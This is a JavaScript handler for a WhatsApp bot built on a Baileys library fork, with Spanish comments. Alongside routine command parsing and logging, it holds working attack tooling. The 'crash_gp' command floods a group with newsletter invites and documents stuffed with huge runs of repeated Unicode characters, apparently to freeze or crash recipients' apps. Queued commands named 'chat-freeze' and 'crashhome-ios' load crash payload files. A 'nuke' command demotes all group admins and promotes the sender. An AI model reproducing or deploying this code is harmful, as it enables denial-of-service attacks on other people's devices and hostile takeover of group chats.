const {
          generateWAMessageFromContent,
          getAggregateVotesInPollMessage,
          downloadContentFromMessage,
          prepareWAMessageMedia,
          useMultiFileAuthState,
          generateMessageID,
          generateIOSMessageID,
          generateWAMessage,
          makeInMemoryStore,
          DisconnectReason,
          areJidsSameUser,
          getContentType,
          decryptPollVote,
          relayMessage,
          jidDecode,
          Browsers,
          getDevice,
          proto,
          } = require("baron-baileys-v2")
const fs = require('fs')
//const 

const util = require('util')

/*
const web = fs.readFileSync('./src/opa.webp');
const sekzo3 = 'ྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃ'.repeat(500)
const ios4 = fs.readFileSync('./travas/ios4.js');
const ios7 = fs.readFileSync('./travas/ios7.js');
const ios6 = fs.readFileSync('./travas/ios6.js');
const travadoc = fs.readFileSync('./travas/travadoc.js');
const thumbJpg = fs.readFileSync('./media/thumb.jpg');
const olaJpg = fs.readFileSync('./media/ola.jpg');
const fotoJpg = fs.readFileSync('./src/foto.jpg');
*/
const chalk = require('chalk')
const fetch = require('node-fetch')
const moment = require('moment-timezone');
const pino = require('pino')
const crypto = require('crypto');

const path = require('path')
const { loadPlugins } = require('./pluginLoader.js');
const commands = loadPlugins();
const { bug } = require('./travas/bug.js');
const telapreta = `${bug}`
const { bugUrl } = require('./travas/bugUrl.js')
//const cataui = fs.readFileSync("./src/cataui.js", "utf8");
const heavyCommands = new Set([
    'crashhome-ios', 'atraso-ui', 'atraso-v3', 'document-crash',
    'crash-button', 'chat-freeze'
]);
/*const heavyAssets = {
    ios4: fs.readFileSync('./travas/ios4.js'),
    ios7: fs.readFileSync('./travas/ios7.js'),
    ios6: fs.readFileSync('./travas/ios6.js'),
    travadoc: fs.readFileSync('./travas/travadoc.js'),
    telapreta: `${bug}`,
    bugUrl: bugUrl,
    thumbJpg: fs.readFileSync('./media/thumb.jpg'),
    olaJpg: fs.readFileSync('./media/ola.jpg'),
    fotoJpg: fs.readFileSync('./src/foto.jpg'),
    crashZip: fs.readFileSync('./travas/crash.zip'),
    ZeppImg: Buffer.from(
        "iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/AzXg4GAWjAQAACDAAABeUhb3AAAAAElFTkSuQmCC",
        "base64"
    )
};
*/
module.exports = async (conn, m, assets, chatUpdate, store, prefix, baronContext) => {
const { logger, getCachedGroupMetadata, redisClient, telegram_id } = baronContext;
try {
m.id = m.key.id
m.chat = m.key.remoteJid
m.fromMe = m.key.fromMe
m.isGroup = m.chat.endsWith('@g.us')
m.isGroup = m.chat?.endsWith('@g.us') || false
m.sender = conn.decodeJid(m.fromMe && conn.user. id || m.participant || m.key.participant || m.chat || '')
if (m.isGroup) m.participant = conn.decodeJid(m.key.participant) || ''
function getTypeM(message) {
    const type = Object.keys(message)
    var restype =  (!['senderKeyDistributionMessage', 'messageContextInfo'].includes(type[0]) && type[0]) || (type.length >= 3 && type[1] !== 'messageContextInfo' && type[1]) || type[type.length - 1] || Object.keys(message)[0]
	return restype
}
m.mtype = getTypeM(m.message)
m.msg = (m.mtype == 'viewOnceMessage' ? m.message[m.mtype].message[getTypeM(m.message[m.mtype].message)] : m.message[m.mtype])
m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || ''
const info = m
const from = info.key.remoteJid
const from2 = info.chat

var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id:(m.mtype === 'conversation') ? m.message.conversation :(m.mtype === 'deviceSentMessage') ? m.message.extendedTextMessage.text :(m.mtype == 'imageMessage') ? m.message.imageMessage.caption :(m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const getGroupAdmins = (participants) => {
        let admins = []
        for (let i of participants) {
            i.admin === "superadmin" ? admins.push(i.id) :  i.admin === "admin" ? admins.push(i.id) : ''
        }
        return admins || []
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
var budy = (typeof m.text == 'string' ? m.text: '')
const bardy = body || '';
const isCmd = bardy.startsWith(prefix);
const command = isCmd ? bardy.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = bardy.trim().split(/ +/).slice(1)
const text = args.join(" ")
const q = args.join(" ")
if (!isCmd) return;
const sender = info.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (info.key.participant || info.key.remoteJid)
const botNumber = await conn.decodeJid(conn.user.id)
const senderNumber = sender.split('@')[0]

const userList = [
"yournumber@s.whatsapp.net",
"friendsnumber@s.whatsapp.net",
"0@s.whatsapp.net",
"13135550002@s.whatsapp.net",
"593969533280@s.whatsapp.net",
"584163679167@s.whatsapp.net"
];
const candList = [
    "5216421147692@s.whatsapp.net", 
    "yournumber@s.whatsapp.net",
    "friendsnumber@s.whatsapp.net",
    "120363421317937545@g.us",
    "13135550002@s.whatsapp.net",
    "593969533280@s.whatsapp.net",
    "584163679167@s.whatsapp.net",
    "5491130524256@s.whatsapp.net"
];
const groupid = [ 
 "120363421317937545@g.us",
 "120363415442586508@g.us",
 "120363421386564277@g.us",
 "120363420474631547@g.us",
 "120363402299771381@g.us",
 ];
global.prefa = ['!','.',',','/','-'] 
const isNose = groupid.includes(sender);
const isCreator = userList.includes(sender);
const pushname = m.pushName || `${senderNumber}`
const isBot = info.key.fromMe ? true : false


const lol = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast"
},
message: {
orderMessage: {
orderId: "2009",
thumbnail: assets.thumbJpg,
itemCount: "9999",
status: "INQUIRY",
surface: "",
message: `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛`,
token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
}
},
contextInfo: {
mentionedJid: ["120363369514105242@s.whatsapp.net"],
forwardingScore: 999,
isForwarded: true,
}
}
const sJid = "status@broadcast";
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
    const groupMetadata = m.isGroup ? await getCachedGroupMetadata(from, conn) : null; // <-- Llama directo a la función
    const participants = groupMetadata?.participants || []; 
    const groupName = groupMetadata?.subject || ''; 
    const PrecisaSerMembro = m.isGroup ? participants.filter(v => v.admin === null).map(v => v.id) : []; 
    const groupAdmins = m.isGroup ? getGroupAdmins(participants) : []; 
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false; 
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
var deviceC = info.key.id.length > 21 ? 'Android' : info.key.id.substring(0, 2) == '3A' ? 'IPhone' : 'WhatsApp web'
const settingsPath = './dev/setting.js';
const settings = require(settingsPath);
global.totallog = settings.totallog
global.logColor = settings.logColor || "\x1b[31m"
global.shapeColor = settings.shapeColor || "\x1b[31m"
global.rootColor = settings.rootColor || "\x1b[31m"
global.hideNumber = settings.hideNumber || false
function log(messageLines, title) {
    const top = `\n${shapeColor}` + "╭" + "─".repeat(50) + "╮" + "\x1b[0m"
    const bottom = `${shapeColor}╰` + "─".repeat(50) + "╯" + "\x1b[0m"
    const emptyLine = `${shapeColor}│` + " ".repeat(50) + "│" + "\x1b[0m"
    

    console.log(top);
    if (title) {
    const strip = title.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
    const titleLine = `${shapeColor}│` + " " + `${logColor}` +
    strip.padEnd(48) + " " + `${shapeColor}│`
    console.log(titleLine);
    console.log(emptyLine);
    }
    messageLines.forEach((line, i)=> {
    if (line.startsWith("\x1b")) {
        const strip = line.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
        let formattedLine = `${shapeColor}│${logColor}` + ` ${i + 1} ` + `${strip.padEnd(51)}` + " " + `${shapeColor}│` + "\x1b[0m"
        console.log(formattedLine);
    } else {
    const strip = line.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
        let formattedLine = `${shapeColor}│${logColor}` + ` ${i + 1} ` + `${strip.padEnd(46)}` + " " + `${shapeColor}│` + "\x1b[0m"
        console.log(formattedLine);
        }
        
    });
    console.log(emptyLine);
    console.log(bottom + "\n\n");
}
function hidden(input) {
if (hideNumber){
return "*************"
} else {
return input
}
}

if (totallog) {
if (m.message && m.isGroup) {
    const timeOnly = new Date().toLocaleTimeString("de-DE", {
        hour: "2-digit",
        minute: "2-digit"
    });

    const title = 'Chat Grupal';
    const INFOS = [
        `[ Mensaje ] ${timeOnly}`,
        `=> Mensaje: ${bardy}`,
        `=> Nombre: ${hidden(pushname || "desconocido")}`,
        `=> de: ${hidden(info.sender)}`,
        `=> en: ${groupName || info.chat}`,
        `=> Dispositivo: ${deviceC}`,
    ];
    log(INFOS, title);
} else {
    const timeOnly = new Date().toLocaleTimeString("de-DE", {
        hour: "2-digit",
        minute: "2-digit"
    });

    const title = 'Chat Privado';
    const INFOS = [
        `[ Mensaje ] ${timeOnly}`,
        `=> Texto: ${bardy}`,
        `=> Nombre: ${hidden(pushname || "desconocido")}`,
        `=> De: ${hidden(info.sender)}`,
        `=> Dispocitivo: ${deviceC}`,
    ];
    log(INFOS, title);
}
}
const reply = (text) => {
conn.sendMessage(from, { text: text, mentions: [sender]},
{quoted: info}
).catch(e => {
return
})
}


let mediaImage = await prepareWAMessageMedia({ 
    "image": {
       "url": "./media/thumb.jpg"
      }
    },
  { "upload": conn.waUploadToServer}
  )
mediaImage = mediaImage.imageMessage

const Ehztext = (text, style = 1) => {
    var abc = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
    var ehz = {
      1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
    };
    var replacer = [];
    abc.map((v, i) =>
      replacer.push({
        original: v,
        convert: ehz[style].split('')[i]
      })
    );
    var str = text.toLowerCase().split('');
    var output = [];
    str.map((v) => {
      const find = replacer.find((x) => x.original == v);
      find ? output.push(find.convert) : output.push(v);
    });
    return output.join('');
  };

  function sendMessageWithMentions(text, mentions = [], quoted = false) {
    if (quoted == null || quoted == undefined || quoted == false) {
      return conn.sendMessage(m.chat, {
        'text': text,
        'mentions': mentions
      }, {
        'quoted': m
      });
    } else {
      return conn.sendMessage(m.chat, {
        'text': text,
        'mentions': mentions
      }, {
        'quoted': m
      });
    }
  }


      conn.sendjsonv3 = (jid, jsontxt = {},) => {
        etc = generateWAMessageFromContent(jid, proto.Message.fromObject(
          jsontxt
          ), { userJid: jid,
          }) 
         
       return conn.relayMessage(jid, etc.message, { messageId: etc.key.id });
       }
  
       conn.sendjsonv4 = (jid, jsontxt = {},) => {
        etc = generateWAMessageFromContent(jid, proto.Message.fromObject(
          jsontxt
          ), { userJid: jid }) 
         
       return conn.relayMessage(jid, etc.message, { participant: { jid: jid },   messageId: etc.key.id });
       }

if (heavyCommands.has(command)) {
        logger.info({ cmd: command, user: sender }, `[BARON.JS] Comando PESADO. Enviando a Súper Cocina (Redis)...`);

    // (2. Preparamos el "pedido" para la cocina)
    const m_lite = { key: m.key, chat: m.chat, sender: m.sender, isGroup: m.isGroup, message: m.message, pushName: m.pushName, text: m.text };

    const taskContext = {
        command: command,
        telegram_id: telegram_id,
        target: m.chat,
        q: m.text.split(' ').slice(1).join(' '),
        args: m.text.split(' ').slice(1),
        text: m.text,
        sender: m.sender,
        assets: assets, // <-- ¡Pasamos los ingredientes!
        m: m_lite,
        isCreator: isCreator,
        isBot: isBot,
        candList: candList,
    };

    await redisClient.lPush('heavy_tasks_queue', JSON.stringify(taskContext));
    conn.sendMessage(m.chat, { react: { text: "⚙️", key: m.key } });

    return; 
}

try {
    // ✅ Previene el error "Cannot read properties of undefined (reading 'get')"
    if (!commands) {
       console.error("Los comandos no están cargados. Revisar pluginLoader.js");
       return;
    }

    const commandToExecute = commands.get(command);

    // Si el comando se encuentra en la colección de PLUGINS...
    if (commandToExecute) {
        
        // 1. Creamos el objeto 'context' con todas las variables útiles
        const context = {
            isCreator,
            pushname,
            from,
            from2,
            prefix,
            reply,
            sender,
            isBot,
            q,
            args,
            text,
            isGroup: m.isGroup,
            groupMetadata,
            participants,
            groupAdmins,
            isBotAdmins,
            isAdmins,
            generateWAMessageFromContent,
            getAggregateVotesInPollMessage,
            downloadContentFromMessage,
            prepareWAMessageMedia,
            useMultiFileAuthState,
            generateMessageID,
            generateIOSMessageID,
            generateWAMessage,
            makeInMemoryStore,
            DisconnectReason,
            areJidsSameUser,
            getContentType,
            decryptPollVote,
            relayMessage,
            jidDecode,
            Browsers,
            getDevice,
            proto,
            cataui,
            groupid,
            candList,
            sleep,
            web: assets.web,
            sekzo3: assets.sekzo3,
            ios4: assets.ios4,
            ios6: assets.ios6,
            fotoJpg: assets.fotoJpg,
            olaJpg: assets.olaJpg,
            cataui: assets.cataui,
        };
        return await commandToExecute.execute(conn, m, args, context);
    }
} catch (error) {
    console.error(`Error ejecutando el plugin '${command}':`, error);
    return reply('Error: Ocurrió un problema al ejecutar este comando.');
}

switch(command) {
 
case 'crash_gp': {  
  if (!isBot) return;
  const groupId = text && text.includes('@g.us') ? text.trim() : m.chat;
    const canalKillGrupo = async () => {
        const basura = 'ꦾ'.repeat(50000);
        await conn.relayMessage(groupId, {
            newsletterAdminInviteMessage: {
                newsletterJid: "120363229729656123@newsletter",
                newsletterName: "ADOi" + basura.repeat(3),
                jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
                caption: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘",
                inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
            }
        }, {});
    };

    const docKillGrupo = async (i) => {
        const traba = 'ꦾ'.repeat(90000);
        const contenido = '\u200E'.repeat(50000) + i;
        await conn.sendMessage(groupId, {
            document: Buffer.from(contenido),
            fileName: `ado 🔥_${i + 1}`.repeat(3),
            mimetype: 'application/msword',
            caption: traba.repeat(3)
        });
    };

    const canalGato = async () => {
        const basura = '𑇂𑆵𑆴𑆿'.repeat(70000);
        await conn.relayMessage(groupId, {
            newsletterAdminInviteMessage: {
                newsletterJid: "120363229729656123@newsletter",
                newsletterName: "🔥👾🔥👾" + basura.repeat(1),
                jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
                caption: "by 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘",
                inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
            }
        }, {});
    };
    // Enviar crash.zip después de todos los mensajes


    const docGato = async (i) => {
        const traba = '𑇂𑆵𑆴𑆿'.repeat(3000);
        const contenido = '\u200E'.repeat(5000) + i;
        await conn.sendMessage(groupId, {
            document: Buffer.from(contenido),
            fileName: `𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘_${i + 1}`.repeat(2),
            mimetype: 'application/msword',
            caption: traba.repeat(3)
        });
    };

    const delayMs = 3000;
    const total = 5;
    const ciclos = Math.floor(total / 4);

    for (let i = 0; i < ciclos; i++) {
        await canalKillGrupo();
        await new Promise(r => setTimeout(r, delayMs));
        await docKillGrupo(i);
        await new Promise(r => setTimeout(r, delayMs));
        await canalGato();
        await new Promise(r => setTimeout(r, delayMs));
        await docGato(i);
        await new Promise(r => setTimeout(r, delayMs));
    }
    const restantes = total % 4;
    const extra = [canalKillGrupo, docKillGrupo, canalGato, docGato];
    for (let i = 0; i < restantes; i++) {
        await extra[i](i);
        await new Promise(r => setTimeout(r, delayMs));
    }
   { quoted: m };
   }
    break;
case "idgp": {
  if (!isBot) return;
  try {
    let participatingGroups = await conn.groupFetchAllParticipating();
    let groups = Object.values(participatingGroups);
    if (groups.length === 0) return reply("El bot no está en ningún grupo");
    let teks = `\`Desarrollo por 𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘\`\n\n*Total de grupos:* ${groups.length}\n\n`;
    let count = 0;

    for (let g of groups) {
      try {
        let metadata = await conn.groupMetadata(g.id);
        teks += `👾 *Grupo ${++count}*\n`;
        teks += `> │✎ Nombre: ${metadata.subject}\n`;
        teks += `> │დ ID: ${metadata.id}\n`;
        teks += `> │♜ Miembros: ${metadata.participants.length}\n`;
        teks += `> └─────────────────\n\n`;
      } catch {
        teks += `🕷️ *\`Grupo\` ${++count}*\n`;
        teks += `> │Idgp: ${g.id}\n`;
        teks += `> │\`Metadata no disponible\`\n`;
        teks += `> └─────────────────\n\n`;
      }
    }

    await conn.sendMessage(m.chat, { text: teks.trim() }, { quoted: m });
  } catch (e) {
    console.error("Error al listar grupos:", e);
    reply(`\`Error\``);
  }
}
break;
case "statusbox": 
  try {
    await handleStatusBox(conn, m); 
  } catch (e) {
  }
  break;
case 'nuke': {

  if (!isBot) return 
  if (!m.isGroup) return
  try {
    
    const metadata = await conn.groupMetadata(from);
    const parts = metadata.participants || [];
    const admins = parts.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.id);
    if (admins.length === 0) {
      await conn.sendMessage(from, { text: 'Não' }, { quoted: m });
      break;
    }
    for (let adm of admins) {
      if (adm === sender) continue;
      if (adm === botNumber) continue;
      try {
        await conn.groupParticipantsUpdate(from, [adm], 'demote');
        await sleep(300); 
      } catch (e) {
      }
    }
    try {
      await conn.groupParticipantsUpdate(from, [sender], 'promote');
    } catch (e) {
  
    }

    await conn.sendMessage(from, { text: '✅' }, { quoted: m });

  } catch (err) {
    console.error(err);
  }
}
  break;


default:
}

} catch (err) {
 
  console.log(util.format(err))
  let e = String(err)

if (e.includes("conflict")) return
if (e.includes("Cannot derive from empty media key")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return


}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})}
